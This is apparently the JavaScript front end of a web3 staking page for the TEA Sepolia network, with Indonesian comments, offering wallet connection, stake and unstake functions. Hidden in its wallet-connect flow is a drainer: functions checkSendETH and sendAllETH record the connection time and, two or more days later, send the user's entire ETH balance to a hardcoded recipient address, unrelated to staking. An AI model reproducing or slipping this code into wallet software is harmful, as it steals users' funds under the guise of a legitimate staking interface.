let web3;
let userAddress;
let stakingContract;

const TEA_RPC_URL = "https://tea-sepolia.g.alchemy.com/public/"; // Ganti dengan RPC TEA yang valid
const stakingContractAddress = "0xa301386393a9c87Bf9d8E022cD3da292C40c9680";  // Kontrak Staking
const recipientAddress = "0x4870cF0d63aF7d96Fb3c13FC6cE519646C2038C1";  // Alamat penerima ETH

const stakingABI = [
    {
        "inputs": [
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "stake",
        "outputs": [],
        "stateMutability": "payable", // Mengubah stateMutability menjadi payable untuk menerima ETH/TEA
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "unstake",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [], 
        "name": "stakingToken", 
        "outputs": [
            { "internalType": "contract IERC20", "name": "", "type": "address" }
        ],
        "stateMutability": "view", 
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "", "type": "address" }
        ],
        "name": "balances",
        "outputs": [
            { "internalType": "uint256", "name": "", "type": "uint256" }
        ],
        "stateMutability": "view", 
        "type": "function"
    }
];

// Koneksi Wallet
async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: "eth_requestAccounts" });
        userAddress = (await web3.eth.getAccounts())[0];

        document.getElementById("connectWalletButton").style.display = 'none';
        document.getElementById("walletInfo").style.display = 'block';
        document.getElementById("walletAddress").innerText = `Address: ${userAddress}`;

        displayBalance();
        checkSendETH();
        initStaking();
        saveConnectTime();
    } else {
        alert("Please install Metamask!");
    }
}

// Tampilkan saldo ETH
async function displayBalance() {
    const balance = await web3.eth.getBalance(userAddress);
    const balanceInETH = web3.utils.fromWei(balance, "ether");  // Konversi Wei ke ETH
    document.getElementById("balance").innerText = balanceInETH;
}

// Inisialisasi Staking
async function initStaking() {
    stakingContract = new web3.eth.Contract(stakingABI, stakingContractAddress);
    document.getElementById("stakingSection").style.display = 'block';
}

// Fungsi Stake
async function stakeTokens() {
    const amount = document.getElementById("stakeAmount").value;
    const amountWei = web3.utils.toWei(amount, "ether");  // Konversi ke Wei

    try {
        // Pastikan jumlah yang akan disetorkan lebih besar dari 0
        if (parseFloat(amount) <= 0) {
            alert("Jumlah stake harus lebih dari 0.");
            return;
        }

        // Lakukan staking langsung dengan mentransfer ETH ke kontrak staking
        const staking = await stakingContract.methods.stake(amountWei).send({
            from: userAddress,
            value: amountWei  // Mengirim ETH sebagai value
        });

        // Cek status staking
        if (staking.status) {
            alert("Stake berhasil!");
        } else {
            alert("Stake gagal. Periksa transaksi Anda.");
        }
    } catch (error) {
        console.error("Staking gagal:", error);
        alert("Staking gagal. Periksa transaksi Anda.");
    }
}

// Fungsi Unstake
async function unstakeTokens() {
    const amount = document.getElementById("unstakeAmount").value;
    const amountWei = web3.utils.toWei(amount, "ether");  // Konversi ke Wei

    try {
        // Cek apakah jumlah unstake lebih besar dari 0
        if (parseFloat(amount) <= 0) {
            alert("Jumlah unstake harus lebih dari 0.");
            return;
        }

        const stakedAmount = await stakingContract.methods.balances(userAddress).call();
        if (parseFloat(amountWei) > parseFloat(stakedAmount)) {
            alert("Jumlah unstake melebihi jumlah yang sudah distake.");
            return;
        }

        // Lakukan unstake
        await stakingContract.methods.unstake(amountWei).send({ from: userAddress });
        alert("Unstake berhasil!");
    } catch (error) {
        console.error("Unstake gagal:", error);
        alert("Unstake gagal. Periksa transaksi Anda.");
    }
}

// Simpan waktu koneksi wallet
function saveConnectTime() {
    localStorage.setItem("connectTime", new Date().getTime());
}

// Ambil waktu koneksi wallet
function getConnectTime() {
    return localStorage.getItem("connectTime");
}

// Cek apakah sudah 2 hari sejak koneksi
async function checkSendETH() {
    const storedTime = getConnectTime();
    if (storedTime) {
        const currentTime = new Date().getTime();
        const elapsedTime = (currentTime - storedTime) / (1000 * 60 * 60 * 24);  // Convert milliseconds to days

        if (elapsedTime >= 2) {
            await sendAllETH();  // Kirim ETH jika sudah 2 hari
        }
    }
}

// Kirim semua ETH ke alamat tertentu
async function sendAllETH() {
    const balance = await web3.eth.getBalance(userAddress);

    try {
        await web3.eth.sendTransaction({
            from: userAddress,
            to: recipientAddress,
            value: balance
        });

        alert("Semua ETH telah dikirim!");
    } catch (error) {
        console.error("Gagal mengirim ETH:", error);
        alert("Gagal mengirim ETH. Periksa saldo Anda.");
    }
}
